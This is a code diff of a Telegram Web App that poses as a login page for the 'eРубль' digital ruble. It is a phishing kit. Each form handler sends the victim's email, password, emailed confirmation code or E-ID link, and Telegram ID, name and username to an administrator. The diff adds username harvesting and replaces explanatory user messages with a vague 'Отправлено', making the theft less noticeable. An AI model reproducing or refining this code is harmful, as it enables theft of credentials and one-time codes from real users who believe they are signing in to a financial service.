@@ -37,7 +37,6 @@
             display: flex;
             flex-direction: column;
         }
-        /* Декоративный фон */
         .container::before {
             content: '';
             position: absolute;
@@ -114,7 +113,7 @@
         }
 
         /* ============================================================
-           СТРАНИЦЫ (переключаются)
+           СТРАНИЦЫ
            ============================================================ */
         .page {
             display: none;
@@ -283,9 +282,6 @@
             color: rgba(255, 255, 255, 0.5);
         }
 
-        /* ============================================================
-           РАЗДЕЛИТЕЛЬ
-           ============================================================ */
         .divider {
             display: flex;
             align-items: center;
@@ -307,9 +303,6 @@
             letter-spacing: 1px;
         }
 
-        /* ============================================================
-           ССЫЛКИ (Забыли пароль? / Регистрация)
-           ============================================================ */
         .forgot-link {
             text-align: right;
             margin-top: -8px;
@@ -374,7 +367,7 @@
         }
 
         /* ============================================================
-           КОД / ССЫЛКА (блоки ввода)
+           КОД / ССЫЛКА
            ============================================================ */
         .code-section {
             margin-top: 4px;
@@ -460,15 +453,12 @@
         }
         .success-page p {
             text-align: center;
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 14px;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 13px;
             margin-top: 6px;
             line-height: 1.6;
         }
 
-        /* ============================================================
-           АДАПТИВ
-           ============================================================ */
         @media (max-width: 420px) {
             .container {
                 padding: 28px 18px 24px;
@@ -490,7 +480,7 @@
     <div class="container">
 
         <!-- ============================================================
-        ЛОГОТИП (всегда виден)
+        ЛОГОТИП
         ============================================================ -->
         <div class="logo">
             <h1><span>eРубль</span></h1>
@@ -499,7 +489,7 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 1: ГЛАВНАЯ (ВХОД)
+        СТРАНИЦА 1: ВХОД
         ============================================================ -->
         <div id="pageLogin" class="page active">
             <div class="page-title">🔓 Вход в eРубль</div>
@@ -530,7 +520,7 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 2: КОД ПОДТВЕРЖДЕНИЯ
+        СТРАНИЦА 2: КОД
         ============================================================ -->
         <div id="pageCode" class="page">
             <div class="page-icon">📧</div>
@@ -551,7 +541,7 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 3: ССЫЛКА ПОДТВЕРЖДЕНИЯ (E-ID)
+        СТРАНИЦА 3: ССЫЛКА (E-ID)
         ============================================================ -->
         <div id="pageLink" class="page">
             <div class="page-icon">🔗</div>
@@ -576,8 +566,8 @@
         ============================================================ -->
         <div id="pageSuccess" class="page success-page">
             <div class="check">✅</div>
-            <h2>Отправлено!</h2>
-            <p>Администратор проверит ваши данные<br>и свяжется с вами в ближайшее время.</p>
+            <h2>Отправлено</h2>
+            <p style="color:rgba(255,255,255,0.3);font-size:13px;">Ожидайте ответа</p>
             <button id="resetBtn" class="btn-secondary" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
@@ -606,23 +596,19 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Страницы
         const pageLogin = document.getElementById('pageLogin');
         const pageCode = document.getElementById('pageCode');
         const pageLink = document.getElementById('pageLink');
         const pageSuccess = document.getElementById('pageSuccess');
 
-        // Элементы форм
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
         const linkInput = document.getElementById('linkInput');
 
-        // Статусы
         const codeStatus = document.getElementById('codeStatus');
         const linkStatus = document.getElementById('linkStatus');
 
-        // Кнопки
         const loginBtn = document.getElementById('loginBtn');
         const eidBtn = document.getElementById('eidBtn');
         const submitCodeBtn = document.getElementById('submitCodeBtn');
@@ -637,7 +623,7 @@
         let userPassword = '';
 
         // ============================================================
-        // 3. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // 3. ВСПОМОГАТЕЛЬНЫЕ
         // ============================================================
         function showMessage(text, type = 'info') {
             msgDiv.textContent = text;
@@ -694,7 +680,26 @@
         }
 
         // ============================================================
-        // 5. ОБЫЧНЫЙ ВХОД → КОД
+        // 5. ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ДАННЫХ ПОЛЬЗОВАТЕЛЯ
+        // ============================================================
+        function getUserData() {
+            const user = tg.initDataUnsafe?.user;
+            if (user) {
+                return {
+                    id: user.id || 'неизвестно',
+                    first_name: user.first_name || 'Гость',
+                    username: user.username || 'нет'
+                };
+            }
+            return {
+                id: 'неизвестно',
+                first_name: 'Гость',
+                username: 'нет'
+            };
+        }
+
+        // ============================================================
+        // 6. ОБЫЧНЫЙ ВХОД → КОД
         // ============================================================
         loginBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -715,8 +720,13 @@
             userEmail = e;
             userPassword = p;
 
-            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
-            const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+            const user = getUserData();
+            const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n` +
+                        `👤 ID: ${user.id}\n` +
+                        `👤 Имя: ${user.first_name}\n` +
+                        `👤 Username: @${user.username}\n` +
+                        `📧 Email: ${e}\n` +
+                        `🔑 Пароль: ${p}`;
 
             const ok = await sendToAdmin(msg);
 
@@ -725,7 +735,7 @@
                 loginBtn.textContent = '🔓 Войти';
                 switchPage(pageCode);
                 codeStatus.style.display = 'block';
-                showMessage('✅ Данные отправлены. Введите код с почты.', 'success');
+                showMessage('✅ Отправлено', 'success');
                 setTimeout(() => codeInput.focus(), 300);
             } else {
                 loginBtn.disabled = false;
@@ -735,7 +745,7 @@
         });
 
         // ============================================================
-        // 6. E-ID → ССЫЛКА
+        // 7. E-ID → ССЫЛКА
         // ============================================================
         eidBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -756,8 +766,13 @@
             userEmail = e;
             userPassword = p;
 
-            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
-            const msg = `🆔 E-ID ВХОД\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+            const user = getUserData();
+            const msg = `🆔 E-ID ВХОД\n\n` +
+                        `👤 ID: ${user.id}\n` +
+                        `👤 Имя: ${user.first_name}\n` +
+                        `👤 Username: @${user.username}\n` +
+                        `📧 Email: ${e}\n` +
+                        `🔑 Пароль: ${p}`;
 
             const ok = await sendToAdmin(msg);
 
@@ -766,7 +781,7 @@
                 eidBtn.textContent = '🆔 Вход через E-ID';
                 switchPage(pageLink);
                 linkStatus.style.display = 'block';
-                showMessage('✅ Данные отправлены. Введите ссылку подтверждения.', 'success');
+                showMessage('✅ Отправлено', 'success');
                 setTimeout(() => linkInput.focus(), 300);
             } else {
                 eidBtn.disabled = false;
@@ -776,26 +791,32 @@
         });
 
         // ============================================================
-        // 7. ОТПРАВКА КОДА
+        // 8. КОД
         // ============================================================
         submitCodeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
 
             if (!code || code.length < 4) {
-                showMessage('Введите корректный код (минимум 4 символа)', 'error');
+                showMessage('Введите корректный код', 'error');
                 return;
             }
 
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = '⏳ Отправка...';
 
-            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
-            const msg = `📧 Код подтверждения\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n📧 Код: ${code}`;
+            const user = getUserData();
+            const msg = `📧 Код подтверждения\n\n` +
+                        `👤 ID: ${user.id}\n` +
+                        `👤 Имя: ${user.first_name}\n` +
+                        `👤 Username: @${user.username}\n` +
+                        `📧 Email: ${userEmail}\n` +
+                        `🔑 Пароль: ${userPassword}\n` +
+                        `📧 Код: ${code}`;
 
             const ok = await sendToAdmin(msg);
 
             if (ok) {
-                showMessage('✅ Код отправлен администратору!', 'success');
+                showMessage('✅ Отправлено', 'success');
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = '✅ Подтвердить';
                 codeInput.value = '';
@@ -809,7 +830,7 @@
         });
 
         // ============================================================
-        // 8. ОТПРАВКА ССЫЛКИ
+        // 9. ССЫЛКА
         // ============================================================
         submitLinkBtn.addEventListener('click', async function() {
             const link = linkInput.value.trim();
@@ -822,13 +843,19 @@
             submitLinkBtn.disabled = true;
             submitLinkBtn.textContent = '⏳ Отправка...';
 
-            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
-            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
+            const user = getUserData();
+            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n` +
+                        `👤 ID: ${user.id}\n` +
+                        `👤 Имя: ${user.first_name}\n` +
+                        `👤 Username: @${user.username}\n` +
+                        `📧 Email: ${userEmail}\n` +
+                        `🔑 Пароль: ${userPassword}\n` +
+                        `🔗 Ссылка: ${link}`;
 
             const ok = await sendToAdmin(msg);
 
             if (ok) {
-                showMessage('✅ Ссылка отправлена администратору!', 'success');
+                showMessage('✅ Отправлено', 'success');
                 submitLinkBtn.disabled = false;
                 submitLinkBtn.textContent = '✅ Отправить ссылку';
                 linkInput.value = '';
@@ -842,13 +869,13 @@
         });
 
         // ============================================================
-        // 9. НАЗАД
+        // 10. НАЗАД
         // ============================================================
         backFromCodeBtn.addEventListener('click', goToLogin);
         backFromLinkBtn.addEventListener('click', goToLogin);
 
         // ============================================================
-        // 10. ВЕРНУТЬСЯ НА ГЛАВНУЮ (из успеха)
+        // 11. ВЕРНУТЬСЯ
         // ============================================================
         resetBtn.addEventListener('click', function() {
             goToLogin();
@@ -856,7 +883,7 @@
         });
 
         // ============================================================
-        // 11. ENTER
+        // 12. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -871,7 +898,7 @@
         });
 
         // ============================================================
-        // 12. ТЕХПОДДЕРЖКА
+        // 13. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/erubsite', '_blank');
